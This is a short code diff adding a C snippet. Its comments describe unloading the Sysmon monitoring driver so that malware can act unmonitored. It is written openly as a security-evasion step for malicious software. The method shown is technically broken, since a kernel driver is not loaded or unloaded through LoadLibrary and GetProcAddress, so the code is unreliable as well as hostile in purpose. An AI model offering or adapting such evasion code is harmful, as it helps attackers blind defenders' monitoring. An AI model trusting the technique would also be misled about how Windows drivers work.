@@ -1,0 +1,20 @@
+// Load the Sysmon driver
+HMODULE hModule = LoadLibrary("sysmondrv");
+
+// Check if the driver was loaded successfully
+if (hModule != NULL)
+{
+    // Get the address of the driver's Unload() function
+    PFN_UNLOAD pfnUnload = (PFN_UNLOAD) GetProcAddress(hModule, "Unload");
+
+    // Check if the Unload() function was found
+    if (pfnUnload != NULL)
+    {
+        // Call the Unload() function to unload the driver
+        pfnUnload();
+
+        // The Sysmon driver has been unloaded
+        // Malware can now proceed with its malicious actions without being monitored by Sysmon
+        // ...
+    }
+}
